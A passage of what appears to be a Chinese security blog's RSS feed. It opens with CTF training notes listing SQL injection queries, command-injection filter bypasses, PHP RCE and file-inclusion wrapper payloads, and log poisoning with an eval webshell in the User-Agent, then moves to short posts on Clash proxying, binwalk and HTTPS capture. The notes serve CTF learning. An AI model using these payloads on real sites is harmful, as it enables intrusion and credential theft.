class="code"><pre><span class="line">select id,username,password from users union select 1,2,3;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>1</td><td>xiaoming</td><td>xiaoming</td></tr><tr><td>1</td><td>2</td><td>3</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from users where id =1 order by 5</span><br><span class="line"></span><br><span class="line">select id,username,password from users where id =1 union select 1,2,3;</span><br><span class="line"></span><br><span class="line">union select 1,database(),3 #    查数据库名</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #    查数据表名geek</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(column_name),3 from information_schema.tables where table_name=&#x27;geek&#x27; #查字段名</span><br><span class="line"></span><br><span class="line">union select password from geek #   查最终要的数据 </span><br></pre></td></tr></table></figure><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>读写文件</p><h2 id="1-平替命令"><a href="#1-平替命令" class="headerlink" title="1.平替命令"></a>1.平替命令</h2><ul><li><p>cat 、tac</p></li><li><p>head、tail</p></li><li><p>less、more</p></li><li><p>nl</p></li><li><p>strings</p></li><li><p>paste</p></li><li><p>diff</p></li><li><p>base64 xxxx | base64 -d</p></li></ul><h2 id="2-分隔符"><a href="#2-分隔符" class="headerlink" title="2.分隔符"></a>2.分隔符</h2><ul><li>|</li><li>||</li><li>&amp;</li><li>&amp;&amp;</li><li>;</li><li>%0a</li><li>&gt;</li></ul><h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3.绕过过滤"></a>3.绕过过滤</h2><ul><li>关键词过滤</li><li>\    c\at flag.php</li><li>‘ “   c’’a””t flag.php   c”a”t flag.php</li><li>通配符    ca? flag.php   cat fl*   flag.php   fl456789.php</li><li>a&#x3D;ag;b&#x3D;at;c$b fl$a.php</li><li>空格</li><li>cat&lt;&gt;flag.php</li><li>%09   %0b  %0c   %a0  ${IFS}</li><li>$IFS   cat$IFS$2flag.php       cat${IFS}flag.php</li></ul><h2 id="4-使用其他命令"><a href="#4-使用其他命令" class="headerlink" title="4.使用其他命令"></a>4.使用其他命令</h2><ul><li>&#96;</li><li>cat <code>ls</code>      index.php  flag.php readme.txt</li><li>grep -r “flag”</li><li>读取当前目录下所有文件的内容，匹配flag</li><li>base64 &#x2F;flag |  base64 -d        &#x2F;???&#x2F;????64 &#x2F;??4?.???</li><li>echo “cat &#x2F;flag【命令要base64编码】”| base64 -d | bash</li></ul><h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// 对伪协议进行过滤</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// asd(asd());    </span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p>localeconv() 货币信息，第一个是”点“</p><p>current()获取数组中第一个键值对</p><p>scandir()扫描指定目录</p><p>var_dump() 将变量内容进行导出</p><p>next() 将指针向后移动一位show_source()读取某个文件</p><p>readfile() 读文件</p><p>highlight_file()读文件</p><p>file()将某个文件读成数组</p><p>file_get_contents()将某个文件读成字符串</p><p>array_flip() 交换键值对</p><p>array_reverse() 反转数组</p><p>array_rand()获取数组中随机值</p><p>通用payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include include_once()</span><br><span class="line">require require_once()</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;])</span><br></pre></td></tr></table></figure><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>1.data:&#x2F;&#x2F;伪协议</p><p>a.条件</p><p>i.allow_url_fopen &#x3D;On  allow_url_include &#x3D;On</p><p>b.用法</p><p>i.data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></p><p>ii.data:&#x2F;&#x2F;text&#x2F;plain;base,【base64编码的内容】</p><p>iii.data:,<?php phpinfo();?></p><p>2.php:&#x2F;&#x2F;input</p><p>a.条件和上面一样</p><p>b.用法：</p><p>i.include($_GET[‘file’])    ?file&#x3D;php:&#x2F;&#x2F;input</p><p>ii.$_POST:     <?php phpinfo();?></p><p>3.php:&#x2F;&#x2F;filter</p><p>a.php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.<br>php</p><p>b.<code>php://filter/read=convert.base64-encode/resource=xxx. php</code>(读文件源码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`php://filter/write=string.rot13/resource=2.php`(写入文件，相当于打开一个写入的文件流，新建一个文件并指定写的方式)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`?file=php://filter/write=convert.iconv.UCS-2LE.</span><br><span class="line">    UCS-2BE/resource=payload.php`</span><br><span class="line">`&amp;contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?`</span><br><span class="line"></span><br><span class="line">`php://filter/resource=flag.php`(读文件源码)</span><br><span class="line"></span><br><span class="line">    `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php`(读文件源码)(每两位调换位置写入)</span><br><span class="line"></span><br><span class="line">    `php://filter/read=convert.quoted-printable-encode/resource=flag.php`(读文件源码)</span><br></pre></td></tr></table></figure><p>4.phar:&#x2F;&#x2F;</p><p>a.文件上传： zip,     shell.php -&gt; shell.zip    </p><p>b.文件包含： ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.zip&#x2F;shell.php</p><p>c.注意：</p><p>i.shell.zip -&gt;shell.jpg    ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.jpg&#x2F;<br>shell.php</p><p>ii.即使修改后缀，对phar读压缩包也没有影响</p><p>5.compress.zlib:&#x2F;&#x2F;flag.php</p><p>6.zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.zip</p><p>a.需要指定绝对路径</p><p>7.zlib:&#x2F;&#x2F;&#96;压缩流</p><p>8.    <code>compress.zlib://a.txt</code>(读文件)</p><p>9.    <code>compress.bzip2://file.bz2</code></p><p>10.http:&#x2F;x.x.x.x:81&#x2F;shell.php</p><p>日志包含</p><p>?file&#x3D;&#x2F;etc&#x2F;passwd</p><p>日志中，记录了一些关键信息：ip 请求时间  请求行  响应行  user-agent</p><p>1.常见日志路径：</p><p>a.nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>b.apache:   &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p><p>c.&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p>d.&#x2F;var&#x2F;log&#x2F;secure       ssh “<?php phpinfo();?>“@x.x.x.x</p><p>2.请求的时候更改UA头，加上一句话<?php eval($_REQUEST[1])?></p><p>3.重新包含日志，传入参数看一下代码能否执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>怎么序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class test&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public function hello()&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new test;</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>魔法函数</p><p>__toString():   将对象以字符串形式调用</p><p>__invoke();  以函数形式调用</p><p>__get(); 调用不存在属性触发</p><p>__call()； 调用不存在方法触发</p><p>unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存<br>在，此函数可以重建对象可能具有的任何资源。</p><p>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</p><p>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</p><p>__toString：当对象被当做一个字符串使用时调用。</p><p>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</p><p>__wakeup:将在反序列化之后立即被调用，反序列化恢复对象之前<br>调用该方法</p><p>__call:当调用对象中不存在的方法会自动调用该方法。</p><p>__get:在调用私有属性的时候会自动执行</p><p>__isset()在不可访问的属性上调用isset()或empty()触发</p><p>__unset()在不可访问的属性上使用unset()时触发</p><p>__invoke() 将对象当作函数来使用的时候，会自动调用该方法，<br>用“unset()”函数删除对象内部的私有成员属性时，对象会自动用__unset()函数来帮我们删除对象内部的私有成员属性。</p><p>__get()如果试图读取一个对象并不存在的属性的时候，PHP就给出错误信息。如果在类里添加__get方法，并且我们可以用这函数实现类似java中反射的各种操作。</p><h1 id="工具环境"><a href="#工具环境" class="headerlink" title="工具环境"></a>工具环境</h1><p>1.vmware workstation pro 17 及以上</p><p>2.kali <a href="https://www.kali.org/">https://www.kali.org/</a></p><p>3.windows 11 渗透系统</p><p>a.<a href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></p><p>4.CTF toolkit</p><p>a.链接：<a href="https://share.weiyun.com/8cVhjsKl">https://share.weiyun.com/8cVhjsKl</a> 密码：233333</p><ol start="5"><li></li></ol>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的安全之旅（九）——WebCheckList</title>
      <link>http://blog.xingxiaowu.cn/2024/06/25/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94WebCheckList/</link>
      <guid>http://blog.xingxiaowu.cn/2024/06/25/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94WebCheckList/</guid>
      <pubDate>Tue, 25 Jun 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-啥提示都没有&quot;&gt;&lt;a href=&quot;#1-啥提示都没有&quot; class=&quot;headerlink&quot; title=&quot;1. 啥提示都没有&quot;&gt;&lt;/a&gt;1. 啥提示都没有&lt;/h1&gt;&lt;p&gt;既然是web，那就dirsearch扫一下先&lt;/p&gt;
&lt;h1 id=&quot;2-php的命令调用&quot;&gt;&lt;a href=&quot;#2-php的命令调用&quot; class=&quot;headerlink&quot; title=&quot;2. php的命令调用&quot;&gt;&lt;/a&gt;2. php的命令调用&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;title function_ invoke__&quot;&gt;system&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;cat /f*&amp;quot;&lt;/span&gt;);&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="1-啥提示都没有"><a href="#1-啥提示都没有" class="headerlink" title="1. 啥提示都没有"></a>1. 啥提示都没有</h1><p>既然是web，那就dirsearch扫一下先</p><h1 id="2-php的命令调用"><a href="#2-php的命令调用" class="headerlink" title="2. php的命令调用"></a>2. php的命令调用</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/06/25/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94WebCheckList/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的渗透之旅速成篇（四）-记录checklist</title>
      <link>http://blog.xingxiaowu.cn/2024/06/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-checklist/</link>
      <guid>http://blog.xingxiaowu.cn/2024/06/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-checklist/</guid>
      <pubDate>Thu, 06 Jun 2024 12:09:00 GMT</pubDate>
      
      
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/06/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-checklist/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Clash代理游戏</title>
      <link>http://blog.xingxiaowu.cn/2024/05/25/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Clash%E4%BB%A3%E7%90%86%E6%B8%B8%E6%88%8F/</link>
      <guid>http://blog.xingxiaowu.cn/2024/05/25/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Clash%E4%BB%A3%E7%90%86%E6%B8%B8%E6%88%8F/</guid>
      <pubDate>Sat, 25 May 2024 07:48:00 GMT</pubDate>
      
      <description>&lt;p&gt;最近想玩鹅鸭杀&lt;/p&gt;
&lt;p&gt;苦于没钱买加速器&lt;/p&gt;
&lt;p&gt;但是干程序员的&lt;/p&gt;
&lt;p&gt;梯子都有&lt;/p&gt;
&lt;p&gt;梯子为什么不能加速呢？&lt;/p&gt;
&lt;p&gt;我使用的是Clash_for_windows&lt;/p&gt;
&lt;p&gt;查了一下&lt;/p&gt;
&lt;p&gt;确实可以&lt;/p&gt;
&lt;p&gt;下面是步骤教学&lt;/p&gt;
&lt;h1 id=&quot;1-下载TUN插件&quot;&gt;&lt;a href=&quot;#1-下载TUN插件&quot; class=&quot;headerlink&quot; title=&quot;1.下载TUN插件&quot;&gt;&lt;/a&gt;1.下载TUN插件&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>最近想玩鹅鸭杀</p><p>苦于没钱买加速器</p><p>但是干程序员的</p><p>梯子都有</p><p>梯子为什么不能加速呢？</p><p>我使用的是Clash_for_windows</p><p>查了一下</p><p>确实可以</p><p>下面是步骤教学</p><h1 id="1-下载TUN插件"><a href="#1-下载TUN插件" class="headerlink" title="1.下载TUN插件"></a>1.下载TUN插件</h1><p><a href="https://www.wintun.net/">https://www.wintun.net/</a> </p><p>下载就完事了</p><h1 id="2-复制-wintun-插件到-Clash-中"><a href="#2-复制-wintun-插件到-Clash-中" class="headerlink" title="2.复制 wintun 插件到 Clash 中"></a>2.复制 wintun 插件到 Clash 中</h1><p>打开主目录<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/Clash1/20240525203933.png"></p><p>大家应该都是amd的卡</p><p>复制<code>\wintun-0.14.1\wintun\bin\amd64\wintun.dll</code>到这个目录下就完事了</p><h1 id="3-激活TUN插件"><a href="#3-激活TUN插件" class="headerlink" title="3.激活TUN插件"></a>3.激活TUN插件</h1><p>点击 Clash 首页 Service Mode 右侧的 Manage，再点击 Install。此时系统可能会弹出 UAC 提示，允许后 Clash 会自动重启。</p><p>如重启后 Service Mode 右侧地球变为绿色，表示激活成功。</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/Clash1/20240525204129.png"></p><h1 id="4-启动-TUN-模式"><a href="#4-启动-TUN-模式" class="headerlink" title="4.启动 TUN 模式"></a>4.启动 TUN 模式</h1><p>返回 Clash 主页，关闭 System Proxy 并开启 TUN 即可，此时所有流量都会通过 Clash 进行分流。默认 rule 模式下，国内所有 ip 和域名均不会走代理服务器，但请尤其注意系统更新，游戏更新等流量。</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/Clash1/20240525204204.png"><br>正确开启的情况下，系统会多出一个名为 Clash 的网卡。</p><p>如需关闭 TUN 模式，首页关闭 TUN 并开启 System Proxy 即可。</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/clash/">clash</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/clash/">clash</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/05/25/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Clash%E4%BB%A3%E7%90%86%E6%B8%B8%E6%88%8F/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的安全之旅（八）——图片</title>
      <link>http://blog.xingxiaowu.cn/2024/05/20/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87/</link>
      <guid>http://blog.xingxiaowu.cn/2024/05/20/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87/</guid>
      <pubDate>Mon, 20 May 2024 12:17:00 GMT</pubDate>
      
      <description>&lt;p&gt;实不相瞒，看到图片我就头痛&lt;/p&gt;
&lt;p&gt;现在看到图片&lt;/p&gt;
&lt;p&gt;我上去第一件事&lt;/p&gt;
&lt;p&gt;你这玩意是不是塞了什么小玩具&lt;/p&gt;
&lt;h1 id=&quot;打开kali&quot;&gt;&lt;a href=&quot;#打开kali&quot; class=&quot;headerlink&quot; title=&quot;打开kali&quot;&gt;&lt;/a&gt;打开kali&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;binwalk ~/1.png&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;康康里面是不是塞了什么&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;binwalk ~/1.png -e&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;分离图片&lt;/p&gt;
&lt;p&gt;剩下的再看&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>实不相瞒，看到图片我就头痛</p><p>现在看到图片</p><p>我上去第一件事</p><p>你这玩意是不是塞了什么小玩具</p><h1 id="打开kali"><a href="#打开kali" class="headerlink" title="打开kali"></a>打开kali</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ~/1.png</span><br></pre></td></tr></table></figure><p>康康里面是不是塞了什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ~/1.png -e</span><br></pre></td></tr></table></figure><p>分离图片</p><p>剩下的再看</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/05/20/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的渗透之旅速成篇（一）-https抓包</title>
      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/</link>
      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/</guid>
      <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;抓包很常见，以前做开发的时候也经常用&lt;/p&gt;
&lt;p&gt;无论是&lt;code&gt;charles&lt;/code&gt;还是&lt;code&gt;finddler&lt;/code&gt;等等&lt;/p&gt;
&lt;p&gt;你是否遇到过&lt;code&gt;https&lt;/code&gt;一篇红和&lt;code&gt;unkown&lt;/code&gt;的情况？&lt;/p&gt;
&lt;p&gt;2024年了，都是&lt;code&gt;https&lt;/code&gt;了把，&lt;code&gt;http&lt;/code&gt;屈指可数&lt;/p&gt;
&lt;p&gt;那么我们如何抓包&lt;code&gt;https&lt;/code&gt;呢&lt;/p&gt;
&lt;h1 id=&quot;证书&quot;&gt;&lt;a href=&quot;#证书&quot; class=&quot;headerlink&quot; title=&quot;证书&quot;&gt;&lt;/a&gt;证书&lt;/h1&gt;&lt;p&gt;其实说白了，证书才是关键&lt;/p&gt;
&lt;p&gt;我们抓包的本质，是将网络请求代理到某个软件上&lt;/p&gt;
&lt;p&gt;换句话说，自己当“中间人”&lt;/p&gt;</description>
      
      
      
